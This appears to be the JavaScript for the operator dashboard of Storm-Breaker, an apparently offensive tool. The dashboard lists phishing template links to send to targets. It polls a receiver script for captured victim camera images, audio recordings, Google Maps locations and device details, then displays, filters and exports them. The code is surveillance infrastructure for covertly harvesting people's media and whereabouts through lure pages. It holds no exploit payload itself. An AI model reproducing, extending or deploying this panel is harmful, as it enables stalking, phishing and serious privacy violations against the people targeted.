var old_data = ''

function Listener(){ 
    $.post("receiver.php",{"send_me_result":""},function(data){
        if(data != ""){
            if(data.includes("Image")){
                show_notif("Image File Saved",'Path : '+data.slice(26),true)
            }

            else if(data.includes("Audio")){
                show_notif("Audio File Saved",'Path : '+data.slice(26),false)
            }
            
            else if(data.includes("Google Map")){
                show_notif("Google Map Link",data.slice(18),true)
            }

            

            old_data += data+"\n-------------------------\n"
            $("#result").val(old_data)
        }
    })
}


function show_notif(msg,path,status){
    var btn_text = 'open file'
    var timer = 5000
    var type_notif = "success"

    if(msg.includes("available")){
        btn_text = "open link"
        timer = 0
        type_notif = "danger"
    }

    else if(msg.includes("Google Map")){
        btn_text = "open link"
        timer = 0
    }

    GrowlNotification.notify({
        title: msg,
        description: path ,
        type: type_notif,
        closeTimeout: timer,
        showProgress: true, 
        showButtons: status,
        buttons: {
            action: {
                text: btn_text,
                callback: function() {
                    window.open(path.replace("Path : ",""),'popUpWindow','height=640,width=640,left=1000,top=300,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');
                }
            },
                cancel: {
                text: 'Cancel',
                callback: function() {}
            }
        },
        
    });
}



function getRandomInt(max) {
    return Math.floor(Math.random() * max);
}



function saveTextAsFile(textToWrite, fileNameToSaveAs){   
    var textFileAsBlob = new Blob([textToWrite], {type:'text/plain'}); 
    var downloadLink = document.createElement("a");
    downloadLink.download = getRandomInt(10000)+"_"+fileNameToSaveAs;
    if (window.webkitURL != null)
    {
        // Chrome allows the link to be clicked
        // without actually adding it to the DOM.
        downloadLink.href = window.webkitURL.createObjectURL(textFileAsBlob);
    }
    else
    {
        // Firefox requires the link to be added to the DOM
        // before it can be clicked.
        downloadLink.href = window.URL.createObjectURL(textFileAsBlob);
        downloadLink.onclick = destroyClickedElement;
        downloadLink.style.display = "none";
        document.body.appendChild(downloadLink);
    }

    downloadLink.click();
}




function check_new_version(){
    var last_version = 0
    $.get("Settings.json",function(data){
        last_version +=data.version
        
    })



    function check_version_on_git(){
        $.get("https://raw.githubusercontent.com/ultrasecurity/Storm-Breaker/main/Settings.json",function(data){
            new_version = JSON.parse(data)
                if(last_version < new_version.version){
                    show_notif("New version available :)","https://github.com/ultrasecurity/Storm-Breaker",true)
                }
        })
    }



    setTimeout(check_version_on_git,2000)


}



$(document).ready(function(){
    $.post("list_templates.php",function(data){
        
        var get_json = JSON.parse(data)
        for(let i = 0; i < get_json.length;){
            
            // Check if panel-v4 is being used (has .link-card support)
            if ($('.dashboard-card').length > 0) {
                // Modern V4 card style
                $("#links").append('<div class="link-card">' +
                    '<div class="link-text">'+"http://"+location.host+"/templates/"+get_json[i]+"/index.html"+'</div>' +
                    '<button class="btn btn-primary-modern btn-modern cp-btn" data-link="'+"http://"+location.host+"/templates/"+get_json[i]+"/index.html"+'" style="margin: 0;">' +
                    '<i class="fas fa-copy"></i> Copy</button>' +
                    '</div>')
            } else {
                // Original V3 style
                $("#links").append('<div class="mt-2 d-flex justify-content-center" ><p id="path" class="form-control m-1 w-50 ptext">'+"http://"+location.host+"/templates/"+get_json[i]+"/index.html"+'</p><span class="input-group-btn m-1 cp-btn"><button class="btn btn-default" type="button" id="copy-button" data-toggle="tooltip" data-placement="button" title="Copy to Clipboard">Copy </button></span></div>')
            }
            i++
        
        }
        
        // Update stats after links are loaded (for V4)
        if (typeof updateStats === 'function') {
            updateStats()
        }
    })

    setTimeout(function(){

        $(".cp-btn").click(function(){
            var node = $(this).attr('data-link') || $(this).parent().get(0).childNodes[0].textContent
            navigator.clipboard.writeText(node);
            Swal.fire({
                icon: 'success',
                title: 'The link was copied!',
                text: node
                })
            
            })



            timer = setInterval(Listener,2000)

            $("#btn-listen").click(function(){

                if($("#btn-listen").text() == "Listener Runing / press to stop"){
                    clearInterval(timer)
                    console.log("stoped listener")
                    $("#btn-listen").text("Listener stoped / press to start")


                }else{
                    
                    timer = setInterval(Listener,2000)
                    console.log("started listener")
                    $("#btn-listen").text("Listener Runing / press to stop")
                }
                

            })

        

    },1000)

})


// clear text area
$("#btn-clear").click(function(){
    $("#result").val("")
    old_data = ""
    localStorage.setItem('total_logs', '0')
    updateStats()
})

// Enhanced Features
var sessionStartTime = new Date()
var logCount = 0
var recentActivityCount = 0
var fullLogData = []

// Dark Mode Toggle
function toggleTheme() {
    document.body.classList.toggle('dark-mode')
    const icon = document.getElementById('theme-icon')
    if (document.body.classList.contains('dark-mode')) {
        icon.className = 'fas fa-sun'
        localStorage.setItem('theme', 'dark')
    } else {
        icon.className = 'fas fa-moon'
        localStorage.setItem('theme', 'light')
    }
}

// Load saved theme
if (localStorage.getItem('theme') === 'dark') {
    document.body.classList.add('dark-mode')
    document.getElementById('theme-icon').className = 'fas fa-sun'
}

// Update Statistics
function updateStats() {
    // Update total links
    const linkCount = $('.link-card').length
    $('#total-links').text(linkCount)
    
    // Update total logs
    const savedLogs = localStorage.getItem('total_logs') || '0'
    $('#total-logs').text(savedLogs)
    
    // Update session time
    updateSessionTime()
    
    // Update recent activity
    $('#recent-activity').text(recentActivityCount)
}

function updateSessionTime() {
    const now = new Date()
    const diff = Math.floor((now - sessionStartTime) / 1000)
    const minutes = Math.floor(diff / 60)
    const seconds = diff % 60
    $('#session-time').text(String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0'))
}

setInterval(updateSessionTime, 1000)

// Copy all logs
function copyAllLogs() {
    const text = $('#result').val()
    navigator.clipboard.writeText(text).then(function() {
        Swal.fire({
            icon: 'success',
            title: 'Copied!',
            text: 'All logs copied to clipboard',
            timer: 2000,
            showConfirmButton: false
        })
    })
}

// Export as JSON
function exportJSON() {
    const logs = $('#result').val()
    const data = {
        timestamp: new Date().toISOString(),
        session_duration: $('#session-time').text(),
        total_logs: logCount,
        logs: logs.split('\n-------------------------\n').filter(l => l.trim())
    }
    const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'})
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = 'stormbreaker_logs_' + Date.now() + '.json'
    a.click()
}

// Apply Filter
function applyFilter() {
    const searchTerm = $('#search-logs').val().toLowerCase()
    const filterType = $('#filter-type').val()
    
    if (searchTerm === '' && filterType === 'all') {
        $('#result').val(old_data)
        return
    }
    
    const lines = old_data.split('\n-------------------------\n')
    let filtered = lines
    
    if (searchTerm) {
        filtered = filtered.filter(line => line.toLowerCase().includes(searchTerm))
    }
    
    if (filterType !== 'all') {
        filtered = filtered.filter(line => {
            const lower = line.toLowerCase()
            if (filterType === 'location') return lower.includes('google map') || lower.includes('location')
            if (filterType === 'image') return lower.includes('image')
            if (filterType === 'audio') return lower.includes('audio')
            if (filterType === 'device') return lower.includes('device') || lower.includes('browser')
            return true
        })
    }
    
    $('#result').val(filtered.join('\n-------------------------\n'))
}

// Refresh Stats
function refreshStats() {
    updateStats()
    Swal.fire({
        icon: 'info',
        title: 'Stats Refreshed',
        timer: 1500,
        showConfirmButton: false
    })
}

// Update listener status
function updateListenerStatus(isRunning) {
    const badge = $('#listener-status')
    if (isRunning) {
        badge.removeClass('badge-offline').addClass('badge-online')
        badge.html('<i class="fas fa-circle"></i> Listener Active')
    } else {
        badge.removeClass('badge-online').addClass('badge-offline')
        badge.html('<i class="fas fa-circle"></i> Listener Stopped')
    }
}

// Enhanced listener tracking
function trackNewLog(data) {
    logCount++
    recentActivityCount++
    localStorage.setItem('total_logs', logCount)
    fullLogData.push({
        timestamp: new Date().toISOString(),
        data: data
    })
    updateStats()
    
    // Reset recent activity after 5 seconds
    setTimeout(() => {
        recentActivityCount = Math.max(0, recentActivityCount - 1)
        updateStats()
    }, 5000)
}